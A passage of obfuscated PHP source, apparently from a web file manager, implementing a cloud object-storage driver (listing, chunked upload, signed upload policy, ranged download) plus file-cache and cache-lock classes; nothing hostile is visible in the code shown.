$¾¨óé†[$–êâÍ¡Ù[234]] = intval($º¾Ğ‰Èö[$–êâÍ¡Ù[1604]]); $¾¨óé†[$–êâÍ¡Ù[88]] = intval($º¾Ğ‰Èö[$–êâÍ¡Ù[1605]]); $¾¨óé†[$–êâÍ¡Ù[79]] = $º¾Ğ‰Èö[$–êâÍ¡Ù[79]]; return $¾¨óé†; } public function folderInfo($””‘ÅÈš, $á®ĞŒÄñ = false) { $êÒ¥˜ÍÔ =& $_SERVER[ÓïÕü]; $ïÔı¥™› = array($êÒ¥˜ÍÔ[32] => $this->pathThis($””‘ÅÈš), $êÒ¥˜ÍÔ[87] => $this->getPathOuter($êÒ¥˜ÍÔ[8] . $””‘ÅÈš), $êÒ¥˜ÍÔ[33] => $êÒ¥˜ÍÔ[78]); if ($á®ĞŒÄñ) { return $ïÔı¥™›; } $ïÔı¥™›[$êÒ¥˜ÍÔ[234]] = $ïÔı¥™›[$êÒ¥˜ÍÔ[88]] = 0; $ïÔı¥™›[$êÒ¥˜ÍÔ[235]] = $ïÔı¥™›[$êÒ¥˜ÍÔ[236]] = !0; if (empty($ú‘æ¼·â)) { $ú‘æ¼·â = $this->objectMeta($””‘ÅÈš); if (!$ú‘æ¼·â) { return $ïÔı¥™›; } } $ïÔı¥™›[$êÒ¥˜ÍÔ[234]] = intval($ú‘æ¼·â[$êÒ¥˜ÍÔ[1604]]); $ïÔı¥™›[$êÒ¥˜ÍÔ[88]] = intval($ú‘æ¼·â[$êÒ¥˜ÍÔ[1605]]); return $ïÔı¥™›; } private function listObjs($œÏõ•”İ, $Â‘¿…¶¾ = 0, $İ…ßÒ´Ì = 1000) { $ÉôíÖ©ñ =& $_SERVER[ÓïÕü]; $ØåŒşÔ˜ = array($ÉôíÖ©ñ[1606], $ÉôíÖ©ñ[1607] . $İ…ßÒ´Ì); if ($Â‘¿…¶¾) { $ØåŒşÔ˜[] = $ÉôíÖ©ñ[1608] . $Â‘¿…¶¾; } $Òš¬”¨ = $this->ussRequest($œÏõ•”İ, $ÉôíÖ©ñ[1531], !1, $ØåŒşÔ˜); return !$Òš¬”¨[$ÉôíÖ©ñ[1325]] ? !1 : $Òš¬”¨[$ÉôíÖ©ñ[1315]]; } private function fileList($ñõ·•–ƒ, &$—ÊÍ®éı, &$Ë˜¦ë‰µ, $Ì¢éÑÕ¿ = false) { $âº²Â…Ÿ =& $_SERVER[ÓïÕü]; $îó‰Ã‡Ê = $âº²Â…Ÿ[12]; $‚ùéªéğ = 1000; $µ²–†¯Ä = rtrim($ñõ·•–ƒ, $âº²Â…Ÿ[8]) . $âº²Â…Ÿ[8]; while (!0) { check_abort(); $àüÍ’î³ = $this->listObjs($ñõ·•–ƒ, $îó‰Ã‡Ê, $‚ùéªéğ); if (!$àüÍ’î³) { return !1; } $îó‰Ã‡Ê = isset($àüÍ’î³[$âº²Â…Ÿ[1609]]) ? $àüÍ’î³[$âº²Â…Ÿ[1609]] : $âº²Â…Ÿ[12]; $ŠÊ‘¹ÃÃ = isset($àüÍ’î³[$âº²Â…Ÿ[1610]]) ? $àüÍ’î³[$âº²Â…Ÿ[1610]] : array(); foreach ($ŠÊ‘¹ÃÃ as $¯ªãìû«) { $‘àĞ‰­– = $¯ªãìû«[$âº²Â…Ÿ[33]] == $âº²Â…Ÿ[78] ? !0 : !1; $…¨œ‰ÑŠ = ltrim($µ²–†¯Ä . $¯ªãìû«[$âº²Â…Ÿ[32]], $âº²Â…Ÿ[8]) . ($‘àĞ‰­– ? $âº²Â…Ÿ[8] : $âº²Â…Ÿ[12]); $ÑÜ µ¢Ç = array($âº²Â…Ÿ[32] => $…¨œ‰ÑŠ, $âº²Â…Ÿ[33] => $‘àĞ‰­– ? $âº²Â…Ÿ[78] : $âº²Â…Ÿ[233], $âº²Â…Ÿ[79] => $¯ªãìû«[$âº²Â…Ÿ[415]], $âº²Â…Ÿ[1605] => $¯ªãìû«[$âº²Â…Ÿ[1611]]); $this->cacheMethodInfoSet($…¨œ‰ÑŠ, $‘àĞ‰­–, $ÑÜ µ¢Ç); if ($‘àĞ‰­–) { $—ÊÍ®éı[] = $…¨œ‰ÑŠ; if ($Ì¢éÑÕ¿) { $this->fileList($…¨œ‰ÑŠ, $—ÊÍ®éı, $Ë˜¦ë‰µ, $Ì¢éÑÕ¿); } continue; } $Ë˜¦ë‰µ[] = $ÑÜ µ¢Ç; } if (count($ŠÊ‘¹ÃÃ) < $‚ùéªéğ) { break; } } $this->cacheMethodInfoSet($ñõ·•–ƒ, !0); } public function listPath($¡ò½”îÕ, $ñçå½¢í = false) { $µµ‡£š³ =& $_SERVER[ÓïÕü]; $ô‰Å¢—¤ = $üìµù¯š = array(); $this->fileList($¡ò½”îÕ, $ô‰Å¢—¤, $üìµù¯š); foreach ($ô‰Å¢—¤ as $î’Î˜˜ => $¤²©Éúõ) { $ô‰Å¢—¤[$î’Î˜˜] = $this->folderInfo($¤²©Éúõ, $ñçå½¢í); } foreach ($üìµù¯š as $î’Î˜˜ => $¤²©Éúõ) { $üìµù¯š[$î’Î˜˜] = $this->fileInfo($¤²©Éúõ[$µµ‡£š³[32]], $ñçå½¢í, $¤²©Éúõ); } return array($µµ‡£š³[85] => $ô‰Å¢—¤, $µµ‡£š³[86] => $üìµù¯š); } public function has($§ØÉõ°, $¯ËÕî¯ï = false, $¦„àæöœ = true) { $Ä±¼ÊÚˆ =& $_SERVER[ÓïÕü]; $“Âú©ä› = $Ä±¼ÊÚˆ[12]; $ç¢ŠòÏ = 500; $´Ñ­Äôø = 0; $œ±ô±¢ = 0; $·¤úè¥ = rtrim($§ØÉõ°, $Ä±¼ÊÚˆ[8]) . $Ä±¼ÊÚˆ[8]; while (!0) { check_abort(); $·³¥ûˆ¾ = $this->listObjs($§ØÉõ°, $“Âú©ä›, $ç¢ŠòÏ); if (!$·³¥ûˆ¾) { return !1; } $“Âú©ä› = isset($·³¥ûˆ¾[$Ä±¼ÊÚˆ[1609]]) ? $·³¥ûˆ¾[$Ä±¼ÊÚˆ[1609]] : $Ä±¼ÊÚˆ[12]; $ÆØ‹êã = isset($·³¥ûˆ¾[$Ä±¼ÊÚˆ[1610]]) ? $·³¥ûˆ¾[$Ä±¼ÊÚˆ[1610]] : array(); if (empty($ÆØ‹êã)) { break; } $Ñ¯‘…¤¨ = array_filter($ÆØ‹êã, function ($çÔ÷‰éá) { $şîøİÊ„ =& $_SERVER[ÓïÕü]; return $çÔ÷‰éá[$şîøİÊ„[33]] == $şîøİÊ„[78]; }); $ğ†í²Ãé = count($ÆØ‹êã); $Ñ¯‘…¤¨ = count($Ñ¯‘…¤¨); $ÍÃ¾æıÜ = $ğ†í²Ãé - $Ñ¯‘…¤¨; if ($¯ËÕî¯ï) { $œ±ô±¢ += $Ñ¯‘…¤¨; $´Ñ­Äôø += $ÍÃ¾æıÜ; if ($ğ†í²Ãé < $ç¢ŠòÏ) { break; } continue; } if ($¦„àæöœ) { if ($ÍÃ¾æıÜ) { return !0; } } else { if ($Ñ¯‘…¤¨) { return !0; } } if ($ğ†í²Ãé < $ç¢ŠòÏ) { break; } } if ($¯ËÕî¯ï) { return array($Ä±¼ÊÚˆ[242] => $´Ñ­Äôø, $Ä±¼ÊÚˆ[243] => $œ±ô±¢); } return !1; } public function listAll($‹À•Î¨÷) { $ÍÍøÛùõ =& $_SERVER[ÓïÕü]; $Éë§ã²± = $êªºµ©É = array(); $this->fileList($‹À•Î¨÷, $Éë§ã²±, $êªºµ©É, !0); $¶ÎµŞº = array_to_keyvalue($êªºµ©É, $ÍÍøÛùõ[32]); foreach ($Éë§ã²± as $å„Æ¹²¦) { if (is_string($å„Æ¹²¦)) { $¶ÎµŞº[$å„Æ¹²¦] = array($ÍÍøÛùõ[79] => 0); } } return $this->listAllFiles($‹À•Î¨÷, $¶ÎµŞº); } public function canRead($íŸôÙ³§) { return $this->exist($íŸôÙ³§) ? !0 : !1; } public function canWrite($£”òÎÊŒ) { return $this->exist($£”òÎÊŒ) ? !0 : !1; } public function getContent($èã÷ó†Ñ) { return $this->fileSubstr($èã÷ó†Ñ, 0, -1); } public function setContent($ú®éÆç¹, $³»äÙÒ = '') { $­Ú‰°ı =& $_SERVER[ÓïÕü]; if (!$³»äÙÒ) { $Íæ¨‡²ª = $this->ussRequest($ú®éÆç¹, $­Ú‰°ı[291]); return $Íæ¨‡²ª[$­Ú‰°ı[1325]]; } $ã…üœ¼Ï = $this->tempFile($this->pathThis($ú®éÆç¹)); file_put_contents($ã…üœ¼Ï, $³»äÙÒ); if ($this->upload($ú®éÆç¹, $ã…üœ¼Ï)) { $this->tempFileRemve($ã…üœ¼Ï); return !0; } return !1; } public function fileSubstr($¾¸Şª®µ, $ñûóôõÓ, $¥³¸Ë¶è) { $™éÛºÙ« =& $_SERVER[ÓïÕü]; if (!($¤ïËøĞ„ = $this->link($¾¸Şª®µ))) { return !1; } $ïèÛ€´€ = !1; if ($¥³¸Ë¶è > 0) { $ŒƒÎ‚°£ = $ñûóôõÓ + $¥³¸Ë¶è - 1; $ïèÛ€´€ = array($™éÛºÙ«[1570] . $ñûóôõÓ . $™éÛºÙ«[465] . $ŒƒÎ‚°£); } $îÃ“àÕÕ = url_request($¤ïËøĞ„, $™éÛºÙ«[1531], !1, $ïèÛ€´€); return $îÃ“àÕÕ[$™éÛºÙ«[841]] ? $îÃ“àÕÕ[$™éÛºÙ«[1315]] : !1; } public function upload($“ÅãËÌğ, $ŒÌÜ¶, $‰šêÌÉË = false, $œ¦¸£œ× = REPEAT_REPLACE) { $ëùÇÄ¾ =& $_SERVER[ÓïÕü]; $ììóşğ = IO::size($ŒÌÜ¶); if ($ììóşğ <= 1024 * 1024 * 200) { $éÊ² ¸À = array($ëùÇÄ¾[1612] . $ŒÌÜ¶); $Áï«·Æœ = $this->ussRequest($“ÅãËÌğ, $ëùÇÄ¾[256], $éÊ² ¸À); return $Áï«·Æœ[$ëùÇÄ¾[1325]] ? $this->getPathOuter($“ÅãËÌğ) : !1; } $”ã½É = 1024 * 1024 * 10; $†Ñê†Ù = array($ëùÇÄ¾[1613], $ëùÇÄ¾[1614] . $ììóşğ, $ëùÇÄ¾[1615], $ëùÇÄ¾[1616] . $”ã½É); $Áï«·Æœ = $this->ussRequest($“ÅãËÌğ, $ëùÇÄ¾[256], !1, $†Ñê†Ù); if (!$Áï«·Æœ[$ëùÇÄ¾[1325]]) { return !1; } $¥µŸĞª™ = $Áï«·Æœ[$ëùÇÄ¾[1315]]; $¡ø‡éŸ = 0; $‚¸çÜ = $¥µŸĞª™[$ëùÇÄ¾[1617]]; $Ô‚ƒ©øÄ = fopen($ŒÌÜ¶, $ëùÇÄ¾[1494]); if (!$Ô‚ƒ©øÄ) { return !1; } do { $„áÙøñ€ = $¥µŸĞª™[$ëùÇÄ¾[1618]]; fseek_64($Ô‚ƒ©øÄ, $¡ø‡éŸ); $åÙÁ¬¿ê = fread($Ô‚ƒ©øÄ, $„áÙøñ€); $©ùÂ¦ùŒ = 0; do { $©ùÂ¦ùŒ++; $¥µŸĞª™ = $this->uploadPart($“ÅãËÌğ, $¥µŸĞª™, $åÙÁ¬¿ê); } while (!$¥µŸĞª™ && $©ùÂ¦ùŒ < 3); if (!$¥µŸĞª™) { return !1; } $‚¸çÜ = $¥µŸĞª™[$ëùÇÄ¾[1617]]; $¡ø‡éŸ += $„áÙøñ€; } while ($‚¸çÜ != -1); fclose($Ô‚ƒ©øÄ); $†Ñê†Ù = array($ëùÇÄ¾[1619], $ëùÇÄ¾[1620] . $¥µŸĞª™[$ëùÇÄ¾[1621]], $ëùÇÄ¾[1615]); $Áï«·Æœ = $this->ussRequest($“ÅãËÌğ, $ëùÇÄ¾[256], !1, $†Ñê†Ù); return $Áï«·Æœ[$ëùÇÄ¾[1325]] ? $this->getPathOuter($´­Ú³šé) : !1; } private function uploadPart($¸ÒÆ±¯Ş, $¸‘›¼„Ü, &$ŞÇÙ–ŞÚ) { $àÖ®èÌ¸ =& $_SERVER[ÓïÕü]; $õ–åƒíÂ = array($àÖ®èÌ¸[1622], $àÖ®èÌ¸[1620] . $¸‘›¼„Ü[$àÖ®èÌ¸[1621]], $àÖ®èÌ¸[1623] . $¸‘›¼„Ü[$àÖ®èÌ¸[1617]], $àÖ®èÌ¸[146] . $¸‘›¼„Ü[$àÖ®èÌ¸[1618]]); $æ½Äª¯ = $this->ussRequest($¸ÒÆ±¯Ş, $àÖ®èÌ¸[256], $ŞÇÙ–ŞÚ, $õ–åƒíÂ); return !$æ½Äª¯[$àÖ®èÌ¸[1325]] ? $æ½Äª¯[$àÖ®èÌ¸[1325]] : $æ½Äª¯[$àÖ®èÌ¸[1315]]; } public function uploadFormData($ñÑû®ßÀ, $—©èÜî– = 3600) { return $this->uploadPolicy($ñÑû®ßÀ, $—©èÜî–); } public function uploadMultiData($–îÈĞƒä, $Ù÷¢ËÓ = 3600) { $äÛŸ¤€î =& $_SERVER[ÓïÕü]; $ƒ£êÛîô = (int) $GLOBALS[$äÛŸ¤€î[7]][$äÛŸ¤€î[79]]; return $this->uploadPolicy($–îÈĞƒä, $Ù÷¢ËÓ, $ƒ£êÛîô); } private function uploadPolicy($¤ĞğÄ›Ô, $ªÓ³é’ = 3600, $óùÍ¼¹ı = 0) { $¿ÃêÄ­Ï =& $_SERVER[ÓïÕü]; $´‹êÛÌ = $¿ÃêÄ­Ï[8] . $this->bucket; $šöóÃë = gmdate($¿ÃêÄ­Ï[1529]); $¹…½úô´ = array($¿ÃêÄ­Ï[1624] => $this->bucket, $¿ÃêÄ­Ï[1625] => $¤ĞğÄ›Ô, $¿ÃêÄ­Ï[1626] => time() + $ªÓ³é’, $¿ÃêÄ­Ï[1627] => $šöóÃë); if ($óùÍ¼¹ı) { $¹…½úô´[$¿ÃêÄ­Ï[1514]] = $óùÍ¼¹ı; } $¹äê³Ìñ = base64_encode(json_encode($¹…½úô´)); $šò·»‚ = base64_encode(hash_hmac($¿ÃêÄ­Ï[1581], "\120\117\x53\x54\46{$´‹êÛÌ}\x26{$šöóÃë}\46{$¹äê³Ìñ}", md5("{$this->userpass}"), !0)); $š•åÒÉœ = array($¿ÃêÄ­Ï[280] => $¹äê³Ìñ, $¿ÃêÄ­Ï[1628] => "\125\120\x59\x55\116\40{$this->username}\x3a{$šò·»‚}", $¿ÃêÄ­Ï[209] => $this->endpoint . $´‹êÛÌ); return $š•åÒÉœ; } public function download($®ùë•¡÷, $ØÄÎâ‡ç) { $Å“Å€Ô = IO::getPathInner(IO::mkfile($ØÄÎâ‡ç)); if (!($Ú“™ í = $this->link($®ùë•¡÷))) { return !1; } $ùé¥ŸÔˆ = 0; $¼Ó şàË = 1024 * 200; $ı²Ù‡« = fopen($Å“Å€Ô, $_SERVER[ÓïÕü][1576]); while (!0) { $æõİ¦úÔ = $this->fileSubstr($®ùë•¡÷, $ùé¥ŸÔˆ, $¼Ó şàË); if ($æõİ¦úÔ === !1) { return !1; } fwrite($ı²Ù‡«, $æõİ¦úÔ); $ùé¥ŸÔˆ += $¼Ó şàË; if (strlen($æõİ¦úÔ) < $¼Ó şàË) { break; } } fclose($ı²Ù‡«); return $ØÄÎâ‡ç; } public function link($ˆª®çµ, $ÃüÓ¼µ– = array()) { $ò…º‡©ï =& $_SERVER[ÓïÕü]; $ˆª®çµ = trim($ˆª®çµ, $ò…º‡©ï[8]); if (!empty($this->token)) { $Û„¹ú÷Õ = strtotime(date($ò…º‡©ï[1629])); $¯¿ÔÓœù = substr(md5($this->token . $ò…º‡©ï[287] . $Û„¹ú÷Õ . $ò…º‡©ï[1630] . $ˆª®çµ), 12, 8) . $Û„¹ú÷Õ; $ÃüÓ¼µ–[] = $ò…º‡©ï[1631] . $¯¿ÔÓœù; } $‹Å‚÷ = !empty($ÃüÓ¼µ–) ? $ò…º‡©ï[76] . implode($ò…º‡©ï[287], $ÃüÓ¼µ–) : $ò…º‡©ï[12]; return $this->getHost() . $ò…º‡©ï[8] . $this->pathEncode($ˆª®çµ) . $‹Å‚÷; } public function fileOut($ÑÀØ…¿Œ, $ßÛü™ÈÛ = false, $ìÔú¡øÓ = false, $¾¦Ÿ£Ü = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÑÀØ…¿Œ, $ßÛü™ÈÛ, $ìÔú¡øÓ, $¾¦Ÿ£Ü); } if (!$ìÔú¡øÓ) { $ìÔú¡øÓ = $this->pathThis($ÑÀØ…¿Œ); } $È÷ÈŒ = $ßÛü™ÈÛ ? array($_SERVER[ÓïÕü][1632] . rawurlencode($ìÔú¡øÓ)) : array(); $ÖÁ®Ú«  = $this->link($ÑÀØ…¿Œ, $È÷ÈŒ); $this->fileOutLink($ÖÁ®Ú« ); } public function fileOutServer($¸İÌê¡ , $áßüÑíÖ = false, $ÃŠ°÷öô = false, $ìò‘½®‡ = '') { parent::fileOut($¸İÌê¡ , $áßüÑíÖ, $ÃŠ°÷öô, $ìò‘½®‡); } public function fileOutImage($¨ºÁÎÕ³, $Ÿ‘ÜÒŸ = 250) { $ê±–é¹  = $this->link($¨ºÁÎÕ³ . $_SERVER[ÓïÕü][1633] . $Ÿ‘ÜÒŸ); $this->fileOutLink($ê±–é¹ ); } public function fileOutImageServer($ ”¢«ı…, $‘âñ‚ì« = 250) { parent::fileOutImage($ ”¢«ı…, $‘âñ‚ì«); } public function hashMd5($š œî™) { $Íã““Îä =& $_SERVER[ÓïÕü]; $‚Â»Ÿƒì = $this->_objectMeta($š œî™); return isset($‚Â»Ÿƒì[$Íã““Îä[248]]) ? $‚Â»Ÿƒì[$Íã““Îä[248]] : !1; } public function size($–³ñäî¸) { $äé©Ô¡Õ = $this->objectMeta($–³ñäî¸); return $äé©Ô¡Õ ? $äé©Ô¡Õ[$_SERVER[ÓïÕü][79]] : 0; } public function info($çú›ûä) { if ($this->isFolder($çú›ûä)) { return $this->folderInfo($çú›ûä); } else { if ($this->isFile($çú›ûä)) { return $this->fileInfo($çú›ûä); } } return !1; } public function exist($€œÄ·¡) { return $this->isFile($€œÄ·¡) || $this->isFolder($€œÄ·¡); } public function isFile($©ÕÅ¼ˆù) { return !$this->isFolder($©ÕÅ¼ˆù) && $this->objectMeta($©ÕÅ¼ˆù); } public function isFolder($¢şå¦ë) { return $this->cacheMethod($_SERVER[ÓïÕü][180], $¢şå¦ë); } protected function objectMeta($˜¬ŠÊä¬) { return $this->cacheMethod($_SERVER[ÓïÕü][182], $˜¬ŠÊä¬); } protected function _objectMeta($‘ ë·Í…) { $…åéÎĞÇ =& $_SERVER[ÓïÕü]; if ($‘ ë·Í… == $…åéÎĞÇ[12] || $‘ ë·Í… == $…åéÎĞÇ[8]) { return array(); } $¹’ûê˜À = $this->ussRequest($‘ ë·Í…, $…åéÎĞÇ[1634]); if (!$¹’ûê˜À[$…åéÎĞÇ[1325]]) { return null; } $æÆìäìª = isset($¹’ûê˜À[$…åéÎĞÇ[1315]]) ? $¹’ûê˜À[$…åéÎĞÇ[1315]] : array(); if (!isset($æÆìäìª[$…åéÎĞÇ[1635]])) { return null; } $Ï©©‰ª“ = array($…åéÎĞÇ[33] => isset($æÆìäìª[$…åéÎĞÇ[1635]]) ? $æÆìäìª[$…åéÎĞÇ[1635]] : null, $…åéÎĞÇ[79] => isset($æÆìäìª[$…åéÎĞÇ[1636]]) ? $æÆìäìª[$…åéÎĞÇ[1636]] : null, $…åéÎĞÇ[248] => isset($æÆìäìª[$…åéÎĞÇ[1637]]) ? $æÆìäìª[$…åéÎĞÇ[1637]] : null, $…åéÎĞÇ[1604] => isset($æÆìäìª[$…åéÎĞÇ[1638]]) ? $æÆìäìª[$…åéÎĞÇ[1638]] : null); $Ï©©‰ª“[$…åéÎĞÇ[1605]] = isset($æÆìäìª[$…åéÎĞÇ[1639]]) ? strtotime($æÆìäìª[$…åéÎĞÇ[1639]]) : $Ï©©‰ª“[$…åéÎĞÇ[1604]]; return $Ï©©‰ª“; } protected function _isFolder($öƒæ’•ú) { $ûÒñÇÏ =& $_SERVER[ÓïÕü]; if ($öƒæ’•ú == $ûÒñÇÏ[12] || $öƒæ’•ú == $ûÒñÇÏ[8]) { return !0; } $ñ“¼¹ñƒ = $this->_objectMeta($öƒæ’•ú); return isset($ñ“¼¹ñƒ[$ûÒñÇÏ[33]]) && $ñ“¼¹ñƒ[$ûÒñÇÏ[33]] == $ûÒñÇÏ[78] ? !0 : !1; } } goto d“‹Ê˜‹¹; b“íŒ–ËÌ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ë½Ğª”Ë, $ªëãã®Í) { $˜»ÑèÙÃ =& $_SERVER[ÓïÕü]; $this->cachePath = $Ë½Ğª”Ë[$˜»ÑèÙÃ[87]]; $this->prefix = $˜»ÑèÙÃ[939]; $this->cacheTime = $ªëãã®Í; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ŠÒ“¡áš) { $´úå‘İ¢ =& $_SERVER[ÓïÕü]; $ŠÒ“¡áš = str_replace(array($´úå‘İ¢[940], $´úå‘İ¢[100], $´úå‘İ¢[76]), $´úå‘İ¢[941], $ŠÒ“¡áš); return $this->cachePath . $´úå‘İ¢[942] . $ŠÒ“¡áš . $´úå‘İ¢[943]; } public function set($—½ñÖ, $Á¾·Üğ, $—ŒäÙ = false) { $—ŒäÙ = $—ŒäÙ ? $—ŒäÙ : $this->cacheTime; $âò†Âö = $this->getFile($—½ñÖ); if (file_put_contents($âò†Âö, $this->prefix . $Á¾·Üğ, LOCK_EX)) { @touch($âò†Âö, intval(time() + $—ŒäÙ)); clearstatcache(); return !0; } @unlink($âò†Âö); return !1; } public function get($×úÈô¦Œ) { $¢›§Å = $this->getFile($×úÈô¦Œ); if (file_exists($¢›§Å) && filemtime($¢›§Å) < time()) { @unlink($¢›§Å); return !1; } $éÎÌÓ—Å = @file_get_contents($¢›§Å); return substr($éÎÌÓ—Å, strlen($this->prefix)); } public function remove($Ôèöø™) { $Á‡±¿¿¸ = $this->getFile($Ôèöø™); return @unlink($Á‡±¿¿¸); } public function deleteAll() { $ÉÆÍÔÎÍ =& $_SERVER[ÓïÕü]; $¢î±¶œ¯ = scandir($this->cachePath); foreach ($¢î±¶œ¯ as $Ÿ¹çò¤ ) { $”ª³†í = $this->cachePath . $Ÿ¹çò¤ ; if (strpos($”ª³†í, $ÉÆÍÔÎÍ[943]) && strpos($”ª³†í, $ÉÆÍÔÎÍ[944])) { @unlink($”ª³†í); } } } public function clearTimeout() { $àåş„—è =& $_SERVER[ÓïÕü]; $«ãÛ‚¬Ù = scandir($this->cachePath); foreach ($«ãÛ‚¬Ù as $Œçû—­®) { $ÙšºŠáö = $this->cachePath . $Œçû—­®; if (strpos($ÙšºŠáö, $àåş„—è[943]) && strpos($ÙšºŠáö, $àåş„—è[944]) && filemtime($ÙšºŠáö) < time()) { @unlink($ÙšºŠáö); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÂÅ÷­ á =& $_SERVER[ÓïÕü]; if (self::$handle) { return self::$handle; } $“ÔüË§“ = $GLOBALS[$ÂÅ÷­ á[6]][$ÂÅ÷­ á[427]]; self::$timeout = $“ÔüË§“[$ÂÅ÷­ á[945]] ? $“ÔüË§“[$ÂÅ÷­ á[945]] : 10; $‹‡”Ì×š = _get($GLOBALS[$ÂÅ÷­ á[6]], $ÂÅ÷­ á[946]); $¤Æï¶¼³ = $“ÔüË§“[$ÂÅ÷­ á[923]] ? $“ÔüË§“[$ÂÅ÷­ á[923]] : $ÂÅ÷­ á[233]; if ($¤Æï¶¼³ == $ÂÅ÷­ á[21] && $‹‡”Ì×š == $ÂÅ÷­ á[13]) { $¤Æï¶¼³ = $ÂÅ÷­ á[233]; } switch ($¤Æï¶¼³) { case $ÂÅ÷­ á[926]: self::$handle = new CacheLockRedis(); break; case $ÂÅ÷­ á[927]: self::$handle = new CacheLockMemcached(); break; case $ÂÅ÷­ á[21]: self::$handle = new CacheLockDatabase(); break; case $ÂÅ÷­ á[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÂÅ÷­ á[947], $ÂÅ÷­ á[948]); } return self::$handle; } private static function key($‹Ô·÷¬£) { return $_SERVER[ÓïÕü][949] . Cache::key($‹Ô·÷¬£); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($æ÷Ò¡¯¾ = '') { self::$errorMsg = $æ÷Ò¡¯¾; } public static function lockGlobal($à«€ï‚Ï, $´ÖóğÑ”) { return self::lock($à«€ï‚Ï, $´ÖóğÑ”, !0); } public static function lock($“ãÃÂˆ, $œ¯ë–æ¢ = false, $˜‰²¢× = false) { $¸é‰²èâ =& $_SERVER[ÓïÕü]; $ÖåÙÛç = self::init(); $Ü£×¤àÒ = self::key($“ãÃÂˆ); $œ¯ë–æ¢ = $œ¯ë–æ¢ ? $œ¯ë–æ¢ : self::$timeout; $õùĞ±Æ³ = timeFloat(); if (_get($GLOBALS, $¸é‰²èâ[950], !1)) { if (!$ÖåÙÛç->lock($Ü£×¤àÒ, 0.2)) { die; } return !0; } $¶¼ú¶ò© = $ÖåÙÛç->lock($Ü£×¤àÒ, $œ¯ë–æ¢); $ÌÁ¸°ÖÅ = timeFloat(); if (!$¶¼ú¶ò©) { $‘•¹ÈüÂ = "\x6c\x6f\x63\x6b\40\x65\x72\162\157\x72\73\x6b\x65\171\x3d{$“ãÃÂˆ}\73\x74\x69\x6d\x65\75{$œ¯ë–æ¢}\73" . self::$errorMsg . $¸é‰²èâ[74] . get_caller_msg(); $ÑË©ñÅæ = LNG($¸é‰²èâ[951]) . "\x28{$œ¯ë–æ¢}\163\51\56" . LNG($¸é‰²èâ[952]); $ÑË©ñÅæ .= $¸é‰²èâ[953]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÑË©ñÅæ = $ÑË©ñÅæ . $¸é‰²èâ[954] . self::$errorMsg; } write_log($¸é‰²èâ[955] . sprintf($¸é‰²èâ[956], timeFloat() - $õùĞ±Æ³) . $¸é‰²èâ[957] . $‘•¹ÈüÂ . $¸é‰²èâ[958] . json_encode(error_get_last()), $¸é‰²èâ[948]); show_json($ÑË©ñÅæ, !1); } if (!$˜‰²¢×) { self::$lockItem[$Ü£×¤àÒ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ù—íîóÎ = number_format(timeFloat() - $ÌÁ¸°ÖÅ, 3); write_log($¸é‰²èâ[959] . $“ãÃÂˆ . $¸é‰²èâ[960] . $Ù—íîóÎ, $¸é‰²èâ[948]); } return $¶¼ú¶ò©; } public static function lockGet($ß¥Ç±™Ì) { $ïûëÆ  = self::key($ß¥Ç±™Ì); if (self::$lockItem[$ïûëÆ ]) { return self::$lockItem[$ïûëÆ ]; } return self::init()->lockGet($ïûëÆ ); } public static function unlock($ĞßƒìñÚ) { $Ò„»şÛ =& $_SERVER[ÓïÕü]; $¼´´ÂÛí = self::key($ĞßƒìñÚ); self::$lockItem[$¼´´ÂÛí] = null; self::init()->unlock($¼´´ÂÛí); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ò„»şÛ[961] . $ĞßƒìñÚ, $Ò„»şÛ[948]); } return; } public static function unlockRuntime() { $î¬ôÓğ  =& $_SERVER[ÓïÕü]; $ìßÑÏÑ¿ = self::init(); $ƒ÷˜ñ°³ = !1; foreach (self::$lockItem as $„Ô¹É† => $Íı·ÒÔÕ) { if (!$Íı·ÒÔÕ) { continue; } $ìßÑÏÑ¿->unlock($„Ô¹É†); if (!$ƒ÷˜ñ°³) { $ƒ÷˜ñ°³ = !0; write_log($î¬ôÓğ [962] . $„Ô¹É† . $î¬ôÓğ [74] . get_caller_msg(), $î¬ôÓğ [948]); continue; } write_log($î¬ôÓğ [962] . $„Ô¹É†, $î¬ôÓğ [948]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $àğÔÄÇ» = number_format(timeFloat() - TIME_FLOAT, 3); write_log($î¬ôÓğ [963] . $àğÔÄÇ» . $î¬ôÓğ [964] . ACTION, $î¬ôÓğ [948]); } } public static function fileLock($ù¬¢›íÆ) { $œ“úËİĞ =& $_SERVER[ÓïÕü]; if (!$GLOBALS[$œ“úËİĞ[965]]) { $GLOBALS[$œ“úËİĞ[965]] = array(); } $GLOBALS[$œ“úËİĞ[965]][$ù¬¢›íÆ] = !1; $ˆÔøß®† = fopen(DATA_PATH . $ù¬¢›íÆ . $œ“úËİĞ[966], $œ“úËİĞ[967]); if (!$ˆÔøß®†) { return !1; } $GLOBALS[$œ“úËİĞ[965]][$ù¬¢›íÆ] = $ˆÔøß®†; if (flock($ˆÔøß®†, LOCK_EX)) { return !0; } self::unlock($ù¬¢›íÆ); show_json($œ“úËİĞ[968], !1); return !1; } public static function fileUnlock($û»††‚å) { $ä¤Ûâ’Ù =& $_SERVER[ÓïÕü]; $º‰ß”Œì = $GLOBALS[$ä¤Ûâ’Ù[965]][$û»††‚å]; if (!$º‰ß”Œì) { return; } $GLOBALS[$ä¤Ûâ’Ù[965]][$û»††‚å] = !1; flock($º‰ß”Œì, LOCK_UN); fclose($º‰ß”Œì); } public static function fileUnlockAll() { $“¨åê¯à =& $_SERVER[ÓïÕü]; if (!isset($GLOBALS[$“¨åê¯à[965]]) || !$GLOBALS[$“¨åê¯à[965]]) { return; } foreach ($GLOBALS[$“¨åê¯à[965]] as $â‚éÓıô => $“Ï°¸¹) { if (!$“Ï°¸¹) { continue; } $GLOBALS[$“¨åê¯à[965]][$â‚éÓıô] = !1; flock($“Ï°¸¹, LOCK_UN); fclose($“Ï°¸¹); } $GLOBALS[$“¨åê¯à[965]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto 